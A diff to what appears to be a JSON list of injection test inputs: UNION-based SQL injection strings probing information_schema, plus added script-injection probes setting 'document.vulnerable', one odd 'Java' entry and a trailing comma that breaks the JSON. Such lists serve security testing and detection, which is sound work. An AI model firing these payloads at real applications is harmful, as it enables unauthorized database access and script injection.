@@ -3918,7 +3918,11 @@
     {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.tables --", "category": "SQL"},
     {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.columns --", "category": "SQL"},
     {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.schemata --", "category": "SQL"},
-    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.views --", "category": "SQL"}
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.views --", "category": "SQL"},
+    {"inputField": ";document.vulnerable=true;;", "category": "HTML"},
+    {"inputField": ";;document.vulnerable=true;", "category": "HTML"},
+    {"inputField": "<mark","category": "Java"},
+    
 
 ]
     
